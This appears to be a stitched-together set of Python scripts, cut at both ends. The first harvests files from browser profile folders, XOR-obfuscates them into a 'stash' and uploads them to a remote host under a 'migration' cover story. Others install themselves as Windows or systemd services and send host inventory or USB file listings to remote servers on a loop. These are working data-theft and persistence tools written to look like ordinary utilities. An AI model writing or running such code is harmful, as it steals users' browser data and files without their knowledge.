    while len(keystream) < length:
        hasher = hashlib.sha256()
        hasher.update(key_seed + counter.to_bytes(8, 'big'))
        keystream.extend(hasher.digest())
        counter += 1
    return bytes(keystream[:length])


def simple_xor_encrypt(data: bytes, key: bytes = b"platform-tooling-default-seed") -> bytes:
    keystream = derive_keystream(key, len(data))
    return bytes(b ^ k for b, k in zip(data, keystream))


def classify_file(filename: str) -> str | None:
    lower_name = filename.lower()
    for cat, patterns in TARGET_PATTERNS.items():
        if any(pat in lower_name for pat in patterns):
            return cat
    return None


def process_browser_profiles(root_dir: str | Path, output_stash: Path) -> int:
    target_dir_name = "browser_profile"
    root_path = Path(root_dir).resolve()

    if not root_path.exists() or not root_path.is_dir():
        log(f"Error: Path '{root_path}' does not exist or is not a directory.")
        return 0

    profile_count = 0
    processed_files_count = 0

    log(f"Scanning '{root_path}' for '{target_dir_name}' directories...")

    try:
        with open(output_stash, "wb") as stash:
            for current_root, dirs, files in os.walk(root_path):
                if target_dir_name in dirs:
                    profile_path = Path(current_root) / target_dir_name
                    profile_count += 1
                    log(f"Found profile: {profile_path}")

                    for profile_root, _, profile_files in os.walk(profile_path):
                        for file in profile_files:
                            file_path = Path(profile_root) / file
                            category = classify_file(file)

                            if category:
                                log(f"  Matched [{category}]: {file_path.relative_to(profile_path)}")
                                try:
                                    with open(file_path, "rb") as f:
                                        file_data = f.read()

                                    encrypted_data = simple_xor_encrypt(file_data)

                                    cat_bytes = category.encode('utf-8')
                                    path_bytes = str(file_path.relative_to(root_path)).encode('utf-8')

                                    record = (
                                        len(cat_bytes).to_bytes(1, 'big') +
                                        cat_bytes +
                                        len(path_bytes).to_bytes(2, 'big') +
                                        path_bytes +
                                        len(encrypted_data).to_bytes(4, 'big') +
                                        encrypted_data
                                    )

                                    stash.write(record)
                                    processed_files_count += 1

                                except (PermissionError, OSError) as e:
                                    log(f"  Warning: Could not read file {file_path}: {e}")
                                except Exception as e:
                                    log(f"  Error: Unexpected error processing {file_path}: {e}")

    except (PermissionError, OSError) as e:
        log(f"Error: Failed to write to stash file '{output_stash}': {e}")
        return 0

    log(f"Scan complete. Processed {profile_count} profile(s). Stored {processed_files_count} files.")
    return processed_files_count


def upload_stash(stash_path: Path, server_host: str = "backup.example.com", port: int = 443, max_retries: int = 3) -> bool:
    if not stash_path.exists() or stash_path.stat().st_size == 0:
        log("Stash file is missing or empty. Skipping upload.")
        return False

    url = f"https://{server_host}:{port}/upload"
    log(f"Attempting upload of '{stash_path.name}' to {url}...")

    try:
        with open(stash_path, "rb") as f:
            payload = f.read()
    except OSError as e:
        log(f"Error reading stash file for upload: {e}")
        return False

    backoff = 2
    for attempt in range(1, max_retries + 1):
        try:
            req = urllib.request.Request(
                url,
                data=payload,
                headers={"Content-Type": "application/octet-stream"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    log("Upload successful.")
                    return True
                else:
                    log(f"Upload returned unexpected status code: {response.status}")
        except urllib.error.URLError as e:
            log(f"Network error during upload attempt {attempt}/{max_retries}: {e.reason}")
        except Exception as e:
            log(f"Unexpected error during upload attempt {attempt}/{max_retries}: {e}")

        if attempt < max_retries:
            sleep_time = backoff ** attempt
            log(f"Retrying in {sleep_time} seconds...")
            time.sleep(sleep_time)

    log("All upload attempts failed. Network operation aborted gracefully.")
    return False


def register_migration_service(registration_record_path: Path) -> None:
    log("Registering migration service...")
    try:
        record_data = f"migrated_at={time.time()}\nstatus=completed\n"
        with open(registration_record_path, "w", encoding="utf-8") as f:
            f.write(record_data)
        log(f"Migration service registration record written successfully to '{registration_record_path.name}'.")
    except OSError as e:
        log(f"Error writing migration registration record: {e}")


def main() -> None:
    search_path = sys.argv[1] if len(sys.argv) > 1 else "."
    output_stash = Path("stash.dat").resolve()
    registration_file = Path("migration_service.log").resolve()

    log("Starting pipeline execution.")

    # Task 1: Scan, extract, encrypt, and write to stash
    processed_count = process_browser_profiles(search_path, output_stash)

    if processed_count > 0:
        # Task 2: Upload stash file with backoff
        upload_stash(output_stash)

        # Task 3: Register migration service
        register_migration_service(registration_file)
    else:
        log("No matching target files found. Skipping upload and registration.")

    log("Pipeline execution completed. Exiting normally.")


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""IT Asset Inventory Agent.
Collects system configuration, installed software, and persists as a system service.
"""

import logging
import os
import platform
import socket
import subprocess
import sys
import time
from datetime import datetime
from typing import List

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)

class InventoryAgent:
    def __init__(self, output_filename: str = "inventory_pack.txt"):
        self.output_filename = output_filename
        self.server_address = ("asset.example.com", 9000)
        self.logger = logging.getLogger(self.__class__.__name__)

    def _get_installed_software(self) -> List[str]:
        """Gathers platform-specific installed software list."""
        software = ["SOFTWARE INVENTORY:"]
        try:
            if platform.system() == "Windows":
                cmd = ["wmic", "product", "get", "name,version"]
                res = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, encoding="utf-8")
                software.extend(res.splitlines())
            elif platform.system() == "Linux":
                # Check for common package managers
                for cmd in [["dpkg-query", "-W", "-f=${Package} ${Version}\n"], ["rpm", "-qa"]]:
                    try:
                        res = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, encoding="utf-8")
                        software.extend(res.splitlines())
                        break
                    except (FileNotFoundError, subprocess.CalledProcessError):
                        continue
        except Exception as e:
            software.append(f"Could not retrieve software list: {e}")
        return software

    def _collect_data(self) -> str:
        data = [
            f"Timestamp: {datetime.now().isoformat()}",
            f"Hostname: {platform.node()}",
            f"OS: {platform.platform()}",
            f"Processor: {platform.processor()}",
        ]
        data.extend(self._get_installed_software())
        return "\n".join(data)

    def _persist_service(self):
        """Registers the script as a system service."""
        script_path = os.path.abspath(sys.argv[0])
        if platform.system() == "Windows":
            cmd = f'sc create ConfigInventoryService start= auto binPath= "python {script_path}"'
            subprocess.run(cmd, shell=True, capture_output=True)
        elif platform.system() == "Linux":
            service_file = "/etc/systemd/system/configinventory.service"
            content = f"[Unit]\nDescription=Config Inventory Service\n[Service]\nExecStart={sys.executable} {script_path}\n[Install]\nWantedBy=multi-user.target"
            try:
                with open(service_file, "w") as f:
                    f.write(content)
                subprocess.run(["systemctl", "enable", "configinventory"], capture_output=True)
            except PermissionError:
                self.logger.warning("Insufficient permissions to create systemd service.")

    def _transmit(self, data: str):
        try:
            with socket.create_connection(self.server_address, timeout=5) as sock:
                sock.sendall(data.encode())
        except Exception as e:
            self.logger.warning("Transmission failed: %s", e)

    def run(self):
        self._persist_service()
        while True:
            self.logger.info("Running inventory cycle...")
            data = self._collect_data()
            try:
                with open(self.output_filename, "w") as f:
                    f.write(data)
            except IOError as e:
                self.logger.error("File write error: %s", e)

            self._transmit(data)
            # Periodically save every 3600 seconds
            time.sleep(3600)

def main():
    agent = InventoryAgent()
    agent.run()

if __name__ == "__main__":
    main()

#!/usr/bin/env python3
from collections import defaultdict
import argparse
import os
import socket
import sys


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Process application usage events and optionally upload them to a collection service."
    )
    parser.add_argument(
        "--host",
        default="timesheet.example.com",
        help="Remote host for the collection service (default: timesheet.example.com)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=8080,
        help="Remote port for the collection service (default: 8080)",
    )
    parser.add_argument(
        "--upload",
        action="store_true",
        help="Attempt to send the generated usage log to the remote collection service",
    )
    return parser.parse_args()


def process_events() -> defaultdict:
    events_by_app = defaultdict(list)

    for line in sys.stdin:
        line = line.strip()
        if not line:
            continue

        parts = line.split('|', 1)
        if len(parts) == 2:
            app, details = parts
            events_by_app[app.strip()].append(details.strip())
        else:
            print(f"Malformed event (skipped): {line}", file=sys.stderr)

    return events_by_app


def write_log_file(events_by_app: defaultdict, filename: str = "usage_log.txt") -> str:
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            for app, operations in sorted(events_by_app.items()):
                f.write(f"Application: {app}\n")
                for operation in operations:
                    f.write(f"  - {operation}\n")
                f.write("\n")
        return filename
    except OSError as e:
        print(f"Error writing to log file: {e}", file=sys.stderr)
        sys.exit(1)


def upload_log(filename: str, host: str, port: int) -> None:
    print(f"Attempting to send log to collection service at {host}:{port}...")
    try:
        with open(filename, 'rb') as f:
            log_data = f.read()

        with socket.create_connection((host, port), timeout=5) as sock:
            sock.sendall(log_data)
        print("Log successfully transmitted to collection service.")
    except (socket.error, socket.timeout, OSError) as e:
        print(f"Warning: Failed to send log to remote service ({e}). Exiting normally.", file=sys.stderr)


def main() -> None:
    args = parse_arguments()
    events_by_app = process_events()

    log_filename = write_log_file(events_by_app)
    print(f"Usage log written locally to {log_filename}")

    if args.upload:
        upload_log(log_filename, args.host, args.port)


if __name__ == '__main__':
    main()

import argparse
import json
import logging
import os
import platform
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("USBScanner")


def get_windows_usb_paths() -> list[str]:
    paths = []
    try:
        cmd = [
            "wmic",
            "logicaldisk",
            "where",
            "DriveType=2",
            "get",
            "DeviceID",
        ]
        result = subprocess.run(
            cmd, capture_output=True, text=True, check=True, timeout=5
        )
        lines = result.stdout.strip().splitlines()
        for line in lines[1:]:
            parts = line.strip().split()
            if parts:
                drive = parts[0]
                paths.append(f"{drive}\\")
    except Exception as e:
        logger.debug(f"Error getting Windows USB paths: {e}")
    return paths


def get_linux_usb_paths() -> list[str]:
    paths = []
    try:
        user = os.environ.get("USER", "")
        search_dirs = ["/run/media", "/media"]
        for base in search_dirs:
            target = os.path.join(base, user) if user else base
            if os.path.exists(target):
                for entry in os.listdir(target):
                    full_path = os.path.join(target, entry)
                    if os.path.isdir(full_path):
                        paths.append(full_path)

        try:
            result = subprocess.run(
                ["lsblk", "-o", "NAME,TRAN,MOUNTPOINT", "-r", "-n"],
                capture_output=True,
                text=True,
                check=True,
                timeout=5,
            )
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 3 and parts[1] == "usb":
                    mountpoint = parts[2]
                    if mountpoint and os.path.exists(mountpoint):
                        if mountpoint not in paths:
                            paths.append(mountpoint)
        except Exception as e:
            logger.debug(f"lsblk query failed: {e}")
    except Exception as e:
        logger.debug(f"Error getting Linux USB paths: {e}")
    return paths


def get_macos_usb_paths() -> list[str]:
    paths = []
    volumes_dir = "/Volumes"
    try:
        if os.path.exists(volumes_dir):
            system_volumes = {"Macintosh HD"}
            for entry in os.listdir(volumes_dir):
                if entry not in system_volumes:
                    full_path = os.path.join(volumes_dir, entry)
                    if os.path.isdir(full_path):
                        paths.append(full_path)
    except Exception as e:
        logger.debug(f"Error getting macOS USB paths: {e}")
    return paths


def get_usb_paths() -> list[str]:
    system = platform.system()
    if system == "Windows":
        return get_windows_usb_paths()
    elif system == "Linux":
        return get_linux_usb_paths()
    elif system == "Darwin":
        return get_macos_usb_paths()
    else:
        return []


def collect_device_metadata(mount_path: str) -> list[dict]:
    file_records = []
    try:
        for root, _, files in os.walk(mount_path):
            for file in files:
                filepath = os.path.join(root, file)
                try:
                    stats = os.stat(filepath)
                    file_records.append(
                        {
                            "path": filepath,
                            "size": stats.st_size,
                            "created": time.ctime(stats.st_ctime),
                            "modified": time.ctime(stats.st_mtime),
                        }
                    )
                except Exception:
                    continue
    except Exception as e:
        logger.debug(f"Error walking path {mount_path}: {e}")
    return file_records


def send_to_remote_server(endpoint: str, payload: dict) -> bool:
    if not endpoint:
        return False
    try:
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            endpoint,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            if 200 <= response.status < 300:
                logger.info(f"Successfully transmitted data to {endpoint}")
                return True
    except (urllib.error.URLError, TimeoutError, ValueError) as e:
        logger.warning(
            f"Network unavailable or endpoint unreachable ({endpoint}): {e}"
        )
    except Exception as e:
        logger.error(f"Unexpected error while sending data to remote server: {e}")
    return False


def register_background_service(interval: int, iterations: int):
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])
    python_exe = sys.executable

    logger.info("Attempting to register background service...")

    if system == "Linux":
        service_content = f"""[Unit]
Description=USB Scanner Utility
After=network.target

[Service]
Type=simple
ExecStart={python_exe} {script_path} --interval {interval} --iterations {iterations}
Restart=on-failure

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/usb-scanner.service"
        try:
            with open("/tmp/usb-scanner.service", "w") as f:
                f.write(service_content)
            subprocess.run(
                ["sudo", "mv", "/tmp/usb-scanner.service", service_path],
                check=True,
            )
            subprocess.run(["sudo", "systemctl", "daemon-reload"], check=True)
            subprocess.run(
                ["sudo", "systemctl", "enable", "usb-scanner.service"],
                check=True,
            )
            subprocess.run(
                ["sudo", "systemctl", "start", "usb-scanner.service"],
                check=True,
            )
            logger.info("Systemd service successfully registered and started.")
        except Exception as e:
            logger.error(f"Failed to register systemd service: {e}")

    elif system == "Windows":
        task_name = "USBScannerUtility"
        cmd = [
            "schtasks",
            "/create",
            "/sc",
            "MINUTE",
            "/mo",
            str(interval),
            "/tn",
            task_name,
            "/tr",
            f'"{python_exe}" "{script_path}"',
            "/f",
        ]
        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True)
            logger.info("Windows Scheduled Task successfully registered.")
        except Exception as e:
            logger.error(f"Failed to register Windows Scheduled Task: {e}")
    else:
        logger.warning(
            f"Background service registration not supported on {system}"
        )


def run_scan(endpoint: str = None):
    logger.info("Starting USB storage scan...")
    paths = get_usb_paths()
    output_dir = Path("./target")
    output_dir.mkdir(parents=True, exist_ok=True)
    output_file = output_dir / "output_file.txt"

    scan_data = {"timestamp": time.time(), "devices": []}

    for path in paths:
        records = collect_device_metadata(path)
        scan_data["devices"].append({"mount_path": path, "files": records})

    try:
        with open(output_file, "w", encoding="utf-8") as f:
            if not paths:
                f.write("No USB storage devices detected.\n")
                logger.info("No USB storage devices detected.")
            else:
                f.write(f"Detected USB Storage Paths: {', '.join(paths)}\n")
                f.write("=" * 80 + "\n\n")

                for device in scan_data["devices"]:
                    f.write(f"Device Mount: {device['mount_path']}\n")
                    if not device["files"]:
                        f.write(
                            "  [No files found or unable to read device]\n\n"
                        )
                        continue

                    for rec in device["files"]:
                        f.write(f"  File: {rec['path']}\n")
                        f.write(f"    Size: {rec['size']} bytes\n")
                        f.write(f"    Created: {rec['created']}\n")
                        f.write(f"    Modified: {rec['modified']}\n")
                    f.write("\n")
        logger.info(f"Metadata successfully written to {output_file}")
    except Exception as e:
        logger.error(f"Failed to write output file: {e}")

    if endpoint:
        send_to_remote_server(endpoint, scan_data)


def main():
    parser = argparse.ArgumentParser(
        description="USB Storage Scanner & Metadata Utility"
    )
    parser.add_argument(
        "--endpoint", type=str, default="", help="Remote server endpoint URL to push data"
    )
    parser.add_argument(
        "--interval",
        type=int,
        default=0,
        help="Execution interval in seconds for background looping",
    )
    parser.add_argument(
        "--iterations",
        type=int,
        default=1,
        help="Number of iterations to run (0 for infinite)",
    )
    parser.add_argument(
        "--register-service",
        action="store_true",
        help="Register utility as an OS background service",
    )

    args = parser.parse_args()

    if args.register_service:
        register_background_service(
            interval=max(1, args.interval // 60) if args.interval else 5,
            iterations=args.iterations,
        )
        return

    iteration_count = 0
    while True:
        run_scan(endpoint=args.endpoint)
        iteration_count += 1

        if args.iterations > 0 and iteration_count >= args.iterations:
            break

        if args.interval > 0:
            logger.info(f"Sleeping for {args.interval} seconds...")
            time.sleep(args.interval)
        else:
            break


if __name__ == "__main__":
    main()

import abc
import datetime
import glob
import json
import logging
import mailbox
import os
